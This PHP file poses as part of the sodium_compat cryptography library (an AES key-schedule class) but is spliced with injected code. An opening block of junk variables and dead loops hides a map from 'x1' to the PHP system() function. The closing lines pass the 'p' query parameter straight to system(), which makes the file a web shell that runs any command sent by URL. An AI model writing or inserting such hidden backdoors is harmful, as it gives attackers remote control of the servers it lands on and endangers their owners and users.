<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

if (class_exists('ParagonIE_Sodium_Core_AES_Expanded', false)) {
    return;
}

/**
 * @internal This should only be used by sodium_compat
 */
class ParagonIE_Sodium_Core_AES_Expanded extends ParagonIE_Sodium_Core_AES_KeySchedule
{
    /** @var bool $expanded */
    protected $expanded = true;
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>